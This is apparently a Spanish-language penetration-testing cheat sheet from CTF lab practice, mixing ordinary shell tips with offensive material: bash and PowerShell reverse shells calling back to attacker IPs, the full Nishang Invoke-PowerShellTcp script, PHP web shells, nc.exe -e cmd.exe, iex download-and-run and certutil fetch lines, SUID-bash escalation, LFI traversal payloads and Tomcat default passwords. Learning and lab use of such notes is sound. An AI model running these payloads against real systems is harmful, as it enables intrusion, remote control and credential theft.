# Acordeon

## S4vitar extractports


```bash

# Used: 
# nmap -p- --open -T5 -v -n ip -oG allPorts

# Extract nmap information
# Run as: 
# extractPorts allPorts
function extractPorts(){
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address"  >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
	cat extractPorts.tmp; rm extractPorts.tmp
}

```

## Nmap

Para tirarle categorias de scripts para probar vulnerabilidades

```
nmap --script "vuln and safe" -p443 10.10.10.17.1 -oN Scan
```




## Stenografia

```
strings onm.jpg -n 10 #Lineas que tengan mas de 10 caracteres

```

Para ver los metadatos

```
exiftool omg.jpg
```

Datos escondidos

```
steghide info omg.jpg
```
Existen herramientas de fuenrza bruta que ayudan a esto busca "steghide brute force".



## Fully TTYs

```bash

script /dev/null -c bash
CTRL+Z
stty -echo raw;fg
    reset
export TERM=xterm
export SHELL=bash
stty size # por si no sabes las medidas de tu pantalla
stty rows  51 columns 189 # Patalla grande
stty rows  40 columns 167 # pantalla de lab viejita
```

## Python Fully TTY

> https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys

````python 

python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
````


## Spawn shells

Recuerda cuando estes en una web e intentes ejecutar una reverse shell. Cambia el & por %26 

```bash

bash -c "bash -i >%26 /dev/tcp/IP/port 0>%261"
bash -c "bash -i >& /dev/tcp/IP/port 0>&1"

```

Powershell one liner Invoke-PowerShellTcpOneLine.ps de Nishang

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Para tener una consola medianamente interactiva en windows siempre usa...

```
rlwrap nc -lvnp 443
```

## Sudo

```
sudo -u asuser whoami

```


## Enum

```
lsb_release -a
systemctl-timers
watch -n 1 ls -l /bin/bash # ver cada segundo ese comando
```

## Find 

```
find \-perm -4000 2>/dev/null #SUID

```

Buscar solo archivos dentro de una carpeta

```
find . -type f
```

Buscar arhivos solo en el la carpeta ( primer nivel) que empiecen por un punto

```
find /var/tmp -maxdepth 1 -type f -name ".*"
```

## SUID

```python

import os

os.system("chmod u+s /bin/bash")

```

## WFUZZ

```
wfuzz -c --hc=404 -t 200 -w rockyou.txt http://example.com/FUZZ
## Follow redirect
-L
## Esconder por tamaño total de caracteres
--hh=totaldecaracteres

```

Para poner mas palabras y que fuzze para meter un segundo payload.

```
wfuzz -c --hc=404 -t 200 -w rockyou.txt -z list,php-html http://example.com/FUZZ.FUZ2Z
```

Para enumerar los subdominios

```
wfuzz -c -t 200 --hh=11439 -w direcbotiry23medium.txt -H "Host: FUZZ.cronos.htb"  http://example.com
wfuzz -c --hw=55 --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.silo.htb"  http://silo.htb/
```

Para poder mandar payloads de diferentes listas usa:

```
wfuzz -z file,/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -z file,/usr/share/wordlists/rockyou.txt -z file,file-extensions.txt  -p localhost:8080 http://10.129.185.202:8080/FUZZFUZ2Z.FUZ3Z 


```

> https://www.pinguytaz.net/index.php/2019/10/18/wfuzz-navaja-suiza-del-pentesting-web-1-3/

## GOBuster

Para enumerar subdominios

```
gobuster vhost -u http://cronos.htb/ -w /subdomains.txt -t 200
```


## PHP reverse shell 


```php
<?php

echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";

?>

```
Existen variantes...

```php

<?php system($_GET['cmd']); ?>

```

Una variacion de reverse shell

```
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.80/443 0>&1'"); ?>
```

## mkdir crear mas de un directorio 

```bash
mkdir -p /uno/subdirectorio2/tres
```

## WhatWeb

Esta es una herramienta muy simple que te dice que cabeceras tiene pero lo interesante es que si le pones el modo -v te puede decir de donde las saca.

```
whatweb IP -v
```

## TCPDUMP

Para ponerme a la escucha en una interfaz en este caso tun0

```
sudo tcpdump -i tun0 -w Captura.cap -n -v

# -n para que evite aplicarnos la resolucion dns
```

Para poder ponernos a la escucha (solo protocolo icmp) y enviarnos pings

```
sudo tcpdump -i tun0 icmp -n

# -n: Indica a tcpdump que no realice la resolución de nombres y direcciones IP, sino que muestre directamente las direcciones numéricas
```
## TSHARK

Este es un Wireshark pero de consola los comando basicos son:

```
tshark -r Captura.cap -Y "http" 2>/dev/null
#El Y es el filtro en este caso se quiere filtrar por peticiones http
```

## Shebang

```bash
#!/bin/bash

chmod u+s /bin/bash

```
## Convertir mayusculas a minusculas y alrreves

Para hacer esta convercion usa esto:

```
tr '[:upper:]' '[:lower:]'
```

## Grep -P -E

### grep -E:

> La opción -E habilita el uso de expresiones regulares extendidas (ERE).En las expresiones regulares extendidas, ciertos caracteres especiales como +, ?, () tienen significados especiales sin necesidad de ser precedidos por un carácter de escape \.
Por ejemplo, con grep -E, puedes utilizar + para representar "uno o más repeticiones", y no necesitas escaparlo como \+.

```
grep -Ei "user|pass|note|key"

````

En el ejemplo anterior va a buscar esos strings es como or el | 

### grep -P 

> La opción -P habilita el uso de expresiones regulares de Perl (PCRE).Las expresiones regulares de Perl son más poderosas y flexibles que las expresiones regulares básicas (BRE) o extendidas (ERE).

> Permite utilizar la mayoría de las características avanzadas de Perl en las expresiones regulares, como el uso de (?...) para grupos no capturadores, lookaheads, lookbehinds, etc. Es especialmente útil si necesitas características más avanzadas que las proporcionadas por las expresiones regulares básicas o extendidas.


```
# Este ejemplo se usa el only match se activan las reg ex de perl y se escapa el punto despues se busca que despues del punto existan 40 caracteres
grep -oP '\.\w{40}'

```

## Enlace simbolico

Son como los accesos directos pero para linux existen otros enlaces aparte de los simbolicos los duros.

```
ln -s -f /root/root.txt index.html

ln: Es el comando para crear enlaces.
-s: Es la opción que indica que se debe crear un enlace simbólico.
-f: Es la opción que indica que, si ya existe un archivo llamado index.html, se debe sobrescribir sin preguntar.

```

## Ascii

```
man ascii
# Por ejemplo para imprimir el guion si es un bad char

printf "\055"; echo
guion=$(printf "\055")
## Ahora por ejemplo de hacer que el / que es un bad char supongamos que  la variable env es /

comando con guiones | sed 's/\//${HOME}/g' # esto lo que hace es donde encuentre un / lo va substituir por lo que valga $HOME
```

## Python break points

Para esto se necesita importar la libreria pdb 

```python3
#pip uninstall pyelftools -y
#pip install pyelftools==0.29

 
from pwn import * 

import requests
import pdb# break point--------------------------------------------------------------------------->
import signal#USas signal para capturar el CTRL+C
import sys
import urllib3
import time# aqui se usa time.sleep
import re # explresiones regulares

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)


#CTRL+C
signal.signal(signal.SIGINT, def_handler)

main_url="https://10.129.68.239/index.php"

def executeCommand():
        s=requests.session()
        urllib3.disable_warnings()
        s.verify = False
        r = s.get(main_url)
        pdb.set_trace()#break point------------------------------------------------------------->
        #print(r.text)<


if __name__== '__main__':
#       time.sleep(10)
        executeCommand()


```

Cuando ejecutas el programa entra en una especie de depurador de consola algunos comandos son: aprieta l

![image](https://github.com/gecr07/Acordeon/assets/63270579/ef1babf7-f3be-4693-a6a3-5ea5f907c6b7)

> https://realpython.com/python-debugging-pdb/

![image](https://github.com/gecr07/Acordeon/assets/63270579/92c89275-1dfd-41e2-ba62-a2f89265958d)

Ahora quiero ver la repuesta recuerda que al final por detras todo tiene clases entonces:

![image](https://github.com/gecr07/Acordeon/assets/63270579/f08b5052-a678-49fb-9cf5-bd9b4b21cfdf)

Nos va a mostrar el html:

![image](https://github.com/gecr07/Acordeon/assets/63270579/46e077e1-320d-4ca2-b790-d85eb6d0e98d)

## Terminal Shortcuts

```bash

Terminal 

CTRL + A #Ir al incio
CTRL + E # Ir al final 
ALT + B # Una palabra antes (Before)
ALT + F # Para adelante

Man 

CTRl + Shift #Buscar
n # para buscar adelante
shift + n ( osea N) # para buscar hacia atras
g Ir a la primera linea del manual man

TMUX

CTRL + B Shift + ! # Para un panel convertirlo en una ventana nueva.
CTRL + B Shift + [ # Para copiar se hace
Copy mode CTRL + Space # Selecciona 
CTRL + W # Eso es copia
CTRL + B + SHIFT + ] # pega lo copiado
#Buscar
Ya en el copy mode
CTRL + s
CTRL + r
n # para buscar en de abajo para arriba otra concidencia
SHIFT + n # para buscar en orden inverso.
```

> https://superuser.com/questions/231002/how-can-i-search-within-the-output-buffer-of-a-tmux-shell


## Batcat

```bash
batcat file -l ruby
```

## SSH enum

Esto se puede de la version < 7.79 (para abajo)  IGUAL CHECA PORQUE PUEDEN SALIR MAS VERCIONES EN EL FUTURO ESTO ES UNA GUIA NOMAS.

![image](https://github.com/gecr07/Acordeon/assets/63270579/fd6442e6-ffa2-484d-9f73-e8bfca42c944)


Para probar passwords

```
sshpass -p 'passwd' ssh user@127.0.0.1
```

Pero si buscas sshenum python3 salen scripts.

> https://github.com/epi052/cve-2018-15473/blob/master/ssh-username-enum.py

![image](https://github.com/gecr07/Acordeon/assets/63270579/b53a5a8f-da0a-449f-8ce8-ca765caca76e)

## grep

Para buscar una palabra ( y que grep muestre la linea) y que inicie y acabe.

```
## -n imprime la linea
grep -n "^api$"
```

## Matar procesos (Kill killall)

![image](https://github.com/gecr07/Acordeon/assets/63270579/656f1836-1ecf-4f16-9de6-8532e9051523)

```
CTRL+Z
kill %
```

> El comando killall en Linux se utiliza para enviar una señal de terminación a procesos basándose en sus nombres. A diferencia del comando kill, que requiere especificar el ID del proceso (PID), killall permite matar procesos por su nombre.

```
killall openvpn
```

## HEX a ASCII (xxd)

Para pasar de hex a ascii usa:

```
xxd -ps -r;echo

```

## CEWL

Listas de palabras para brute force de lo mismo que esta en la pagina sirve por ejemplo para encontrar el usuario hype en Valentine (machine).

```
cewl -v --depth 2 --write lista.txt http://10.129.44.3/dev/

```

## Sponge

Escribir sobre el mismo archivo que modificaste (bastante util ahorra comandos y no acepta echos cuidado con eso)

```
cat id_rsa | tr -d ' ' | xxd -ps -r | sponge id_rsa
```


## id_rsa (600 y 700)

Son permisos que son validos (600 y 700).  En general, se recomienda que solo el propietario tenga acceso de lectura y escritura al archivo. 

```
chmod 600 id_rsa
```

## JTR (ssh2john)

```
john -w=/usr/share/wordlists/rockyou.txt hash
```

## Chown

![image](https://github.com/gecr07/Acordeon/assets/63270579/c369ca96-3758-4148-990e-dbd372b75df6)

Ahora para que los grupos puedan leer y escribir

```
chmod g+rw archivo
```

## Dirty Cow

 Esta vulnerablidad esta en kernels viejos. Esta entre el rango 2.6.22 < 3.9

```
searchsploit dirty cow 
```

![image](https://github.com/gecr07/Acordeon/assets/63270579/374d5cb5-50ec-4ffb-b7f0-e431a9a6b9b0)



## GCC compilar

En los exploit casi siempre te dice como compiarlo asi que busca como:

```
cat exploit.c | grep gcc
```

Para la compilacion

```
gcc exploit.c -o dirty_out
```

## Curl

Peticiones GET se puede hacer sin el -X para este tipo de peticiones.

```
curl -s -X GET "http://10.10.0.10/browse.php?file=something.txt"
```

Para enviar peticiones https y evitar que cheque los certificados usa la opcion -k.

## Borrar caracteres tr y grep -v

Para borrar caracteres usa el grep -v y el tr -d

```
cat file | tr -d '\n'
grep -v "00 00 00 00"
```

## Dynamic Port Fowarding SSH

Primero vamos a editar el archivo de configuracion de proxychains


```
nano /etc/proxychains.conf

socks4 127.0.0.1 1080

```

Segundo nos vamos a conectar a la maquina por ssh con la opcion -D

```
ssh user@10.10.1.8 -D 1080 # mismo puerto que el socks4 que definimos
```
Y en este ejemplo lo usan para comunicarse con el vncviewer en los puertos 5901

```
proxychains vncviwer -passwd secret_key 127.0.0.1:5901
```
Para usar nmap se tiene que usar la -sT afuerzas TCP connect

```
nmap -sT -p21,22,80 erev0s.com
```



##  Revisar puetos en uso (lsof)

Para revisar un puerto si esta en uso:

```
lsof -i:1080 
```

## Certificados SSL

Se puede checar con openssl.

```
openssl s_client -connect 10.10.14.1:443
```

Igual con sslscan 

```
sslscan https://10.10.1.1/
```

## Python pasar a hex

Para pasar a hex se hace asi.

```
python3
hex(10)
Nos regresa la 0xa
```
![image](https://github.com/gecr07/Acordeon/assets/63270579/35cf4197-6bbb-4803-8d78-315157d1e3ca)

## Procmon

Para ver procesos alternativa del pspy

```
#!/bin/bash

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v "procmon.sh" | grep -v "command"
	old_process=$new_process
done

```

## Permisos SUID

```
find \-perm -4000 2>/dev/null 
```

## Watch 

Para ver comandos cada segundo

```bash

watch -n 1 ls -la /bin/bash

```

## Telnet

A veces es mejor usar telenet en vez de nc consideralo.

```
telnet 10.10.1.14 110
```

## MSFVENOM

Para ver las payloads disponibles.

```
msfvenom -l payloads | grep java
```

## Multiples interfaces

Usa el comando

```
hostname -I

```
## Wget

Para descargar lo que sea copia y pega para que o estes escribiendo siempre lo mismo

```
wget http://10.10.14.80:8000/pspy
```

## Impacket

Tienen todas las herramientas para trabajar con AD entonces busca las tools primero con impacket ejemplo: impacket-secretsdump...

### secretsdump

Para sacar los hashes del ntds.dit recuerda que se necesita el registro system.bin

```
impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL
```


## WPSCAN

Aqui tienes los comandos basicos para enumerar un WP

```
wpscan -v --disable-tls-checks --enumerate u,p --url  https://brainfuck.htb/

```

## Enumerar plugins sin WPSCAN ( es un check que se debe de hacer) visto en maquina Tartarsauce

Me ha pasado que wpscan no te da los plugins que existen en la maquina. Se tiene que hacer manualmente.
```
find . -name \*plugin\* | grep -i wp
seclist/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt

```

Ojo esta lista ya tiene una ruta /wp-content/plugins entonces has fuzzing asi:


```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://10.129.1.185:80/webservices/wp/FUZZ 
```

![image](https://github.com/gecr07/Acordeon/assets/63270579/01cbaa09-66af-4c73-b60e-c9c8041a730b)



## lsblk checar particiones

Sirve para ver como esta configurado el disco

```
lsblk

```

## Linpeas

Para que analices en la maquina atacante

```
# Victima
wget 10.10.14.80:8080/linpeas.sh
./linpeas.sh |  nc 10.10.14.80 9002

# Atacante
nc -lvnp 9002 | tee linpeas.out 

```


## Tar

Para comprimir un archivo con esta herramienta 

```
tar -zcvf /var/tmp/masa_out.gz /var/www/html
###
tar.gz
-z: La opción que indica a tar que debe usar gzip para comprimir el archivo.
-c: La opción que indica a tar que debe crear un nuevo archivo.
-v: La opción "verbose" que proporciona una salida detallada durante el proceso.
-f: La opción que permite especificar el nombre del archivo tar que se creará.

```
Para descomprimir 

```
tar -zxvf masa_out -C /directorio/out
###
-z: La opción que indica a tar que el archivo está comprimido con gzip y debe descomprimirse durante la extracción.
-x: La opción que indica a tar que debe extraer archivos del archivo tar.
-v: La opción "verbose" que proporciona una salida detallada durante el proceso.
-f: La opción que permite especificar el nombre del archivo tar del cual se extraerán los archivos. Debe ir seguido del nombre del archivo.

```

## Bash 

While con un or

```bash

# loop until there's a change in cur
echo "Waiting for archive filename to change..."
while [ "$start" == "$cur" -o "$cur" == "" ] ; do
    sleep 10;
    cur=$(find /var/tmp -maxdepth 1 -type f -name ".*");
done

```

Fuente > https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html

Un if que verifica si la variable tienen valor

```
if [ "$filename" ]; then
echo "El archivos tienen nombre..."
fi
```

## Tomcat

La ruta donde se encuentra el panel de control por defecto en un servido tomcat es:

```
http://localhost:8080/manager/html
```

### Passwords por defecto

```
password

Password1
password1
admin
tomcat
tomcat
manager
role1
tomcat
changethis
Password1
changethis
password
password1
r00t
root
toor
tomcat
s3cret
password1
password
admin
changethis
```

## XCLIP

Se usa para copiar de la consola al porta papeles.

```
cat file| xclip -sel clip 
```

Copiar desde la consola a VM a Windows...

```bash
echo "80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162" |  xclip -i -sel p -f | xclip -i -sel c

#La version corta pero que imprime lo que vas a copiar(cosa que yo no le veo problema)

echo "80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,masa" |  xclip -i -sel p -f

```

> https://unix.stackexchange.com/questions/69111/how-to-target-multiple-selections-with-xclip/69134#69134

## Remplazar caracteres TR 

Para remplazar caracteres usa tr de la siguiente manera

```
cat /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt | tr ' ' '/'
ahora queda asi
user pass
user/pass
```

## Chisel (traerse un puerto para que tu puero local sea el puerto de la maquina victima)

Recordar la maquina atacante es el servidor y la maquina vitima el cliente. En el mismo chisel dice que es reverse port forwarding.

```
#Kali
 ./chisel server --reverse -p 4321

### Windows victima

.\chisel.exe client IPKALI:4321 R:445:127.0.0.1:445

```

# Python

## Trasformar de bytes a  UTF-8

Para trasformar un string que esta en formato de bytes usa decode() y para quitar caracteres.

```python
b'.php'
b'.php'.decode()
b'.php'.decode().strip()
```
Para trasformar de str a bytes entonces seria

```

```

## Keepass (gestor de contraseñas)

La extencion de las bases de datos es ***.kdbx**** 

```
keepass2john CEH.kdbx

john -w=/usr/share/wordlists/rockyou.txt hash


```
Como alternativa esta el keepassxc que tiene interfaz grafica yo creo esta mejor...

![image](https://github.com/gecr07/Acordeon/assets/63270579/b6c243ea-15cc-4793-907d-7a184cad8c1c)


## LFI payloads

Combina esto con wfuzz y podrias probar LFIs aunque siempre intenta manual pero de algo puede servir

```
../
../../
../../../
../../../../
../../../../../
../../../../../
../../../../../../
../../../../../../../..
../../../../../../../../
../../../../../../../../../
../../../../../../../../../../
..\
..\..\
..\..\..\
..\..\..\..\
..\..\..\..\..\
..\..\..\..\..\..\
..\..\..\..\..\..\..\
..\..\..\..\..\..\..\..\..\
..\..\..\..\..\..\..\..\..\..\
..\/
.\/.\/
.\/.\/.\/
.\/.\/.\/.\/
.\/.\/.\/.\/.\/
.\/.\/.\/.\/.\/.\/
.\/.\/.\/.\/.\/.\/.\/
.\/.\/.\/.\/.\/.\/.\/.\/
.\/.\/.\/.\/.\/.\/.\/.\/.\/
.\/.\/.\/.\/.\/.\/.\/.\/.\/.\/
%2e%2e%2f
%2e%2e%2f%2e%2e%2f
%2e%2e%2f%2e%2e%2f%2e%2e%2f
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f
%252e%252e%252f
%252e%252e%252f%252e%252e%252f
%252e%252e%252f%252e%252e%252f%252e%252e%252f
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f
%c0%ae%c0%ae%c0%af
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2215%uff0e%uff0e%u2215
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
%uff0e%uff0e%u2216%uff0e%uff0e%u2216
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216
..././
..././..././
..././..././..././
..././..././..././..././
..././..././..././..././..././
..././..././..././..././..././..././
..././..././..././..././..././..././..././
..././..././..././..././..././..././..././..././
....\
....\....\
....\....\....\
....\....\....\....\
....\....\....\....\....\
....\....\....\....\....\....\
....\....\....\....\....\....\....\
....\....\....\....\....\....\....\....\
```



# Windows

## Arquitecura x86 o x64

Saber la arquitectura de un sistema ojo es diferente la arquitectura del sistema que del proceso si la maquina es de 32 bit no hay tema pero de 64 puede correr ambos. Ojo ahi

```cmd
echo %PROCESSOR_ARCHITECTURE%
```
Para saber la arquitectura desde powershell

```powershell
PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
```

Saber la arquitectura del sistema con "systeminfo"

```cmd
systeminfo
```

![image](https://github.com/gecr07/Acordeon/assets/63270579/9b123cd6-ed32-42b4-a551-26731068ad4c)


Con powershell este fragmento de codigo lo saque del sherlock.

```
function Get-Architecture {

    # This is the CPU architecture.  Returns "64-bit" or "32-bit".
    $CPUArchitecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture

    # This is the process architecture, e.g. are we an x86 process running on a 64-bit system.  Retuns "AMD64" or "x86".
    $ProcessArchitecture = $env:PROCESSOR_ARCHITECTURE

    return $CPUArchitecture, $ProcessArchitecture

}

```

## Buscar archivos


Esto es desde powershell pero desde cmd solo quita lo primero

```cmd
cmd /c dir /r /s user.txt
```

## Buscar archivos ocultos

Para listar y buscar usa estas opciones

```
dir /a:h
```

En powershell

```
Get-ChildItem -Force
```

Buscar archivos de una extencion 

```
Get-ChildItem -Recurse -Filter *.kdbx -Force | Select-Object FullName
```

## Alternative data streams

![image](https://github.com/gecr07/Acordeon/assets/63270579/408d5854-40cb-4f53-b6b5-c8932c8bd6b1)


Es una manera de esconder cosas y se ve algo como esto:


Para listar este tipo de archivos

```
dir /R
more < hm.txt:root.txt

```




## Reverse shell for windows

> Nishang is a framework of scripts and payloads that enables using PowerShell for offensive security. I’ll show the reverse shell, but there is a ton more stuff in here.

> https://github.com/samratashok/nishang

###  Nishang (via Invoke-PowerShellTcp.ps1)


Entonces ponemos es linea hasta abajo del archivo con nuestra IP:

```powershell

function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.80 -Port 4444

```

Para descargar y en memoria:

```
powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')
```

### RCE via nc

En kali seclist tiene nc.exe

![image](https://github.com/gecr07/Acordeon/assets/63270579/da729171-7475-4f3c-9968-2aafbc38b221)

De donde s4vitar baja su nc.exe

> https://eternallybored.org/misc/netcat/

```

\\10.10.14.80\share\nc.exe -e cmd.exe 10.10.14.80 443

```
> https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
> https://www.hackingarticles.in/windows-for-pentester-certutil/
> https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65

## Descargar archivos

Algunos comando no se pueden usar debido a las versiones de powershell por ejemplo el siguiente

```
Invoke-WebRequest -Uri 'http://192.168.230.128:8000/iisfinal.txt' -OutFile '.\iisfinal.txt'
```

Y la que por lo que entiendo carga ya el codigo en la memoria

```
powershell iex(new-object net.webclient).downloadstring('http://10.10.14.80:8000/Invoke-PowerShellTcp.ps1')
```

### Certutil 

Esta herramienta es altamente detectada por windows ten cuidado...


```
certutil.exe -urlcache -split -f http://10.10.14.80:8000/iisfinal.txt iisfinal.txt

```


## Smb

Para ver los shares disponibles de una ip puedes usar:

![image](https://github.com/gecr07/Acordeon/assets/63270579/c61816ce-e938-4189-b6c1-9aab84145b70)


```
net view \\10.10.14.80
